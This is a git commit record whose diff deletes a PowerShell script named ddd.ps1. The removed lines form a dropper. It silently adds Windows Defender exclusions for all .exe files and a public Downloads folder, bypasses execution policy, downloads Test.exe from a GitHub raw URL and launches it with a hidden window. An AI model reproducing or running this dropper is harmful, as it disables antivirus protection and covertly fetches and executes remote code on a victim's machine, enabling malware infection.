c68ea585730a75324eb6f817035cc0caadbc98d6
AmjadBalls <155375827+AmjadBalls@users.noreply.github.com>
2024-12-17 15:10:02 +0200

    Delete ddd.ps1

--- ddd.ps1
+++
@@ -1,4 +0,0 @@
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Test.exe' -OutFile 'C:\Users\Public\Downloads\Test.exe'"
-Start-Process "C:\Users\Public\Downloads\Test.exe" -WindowStyle Hidden
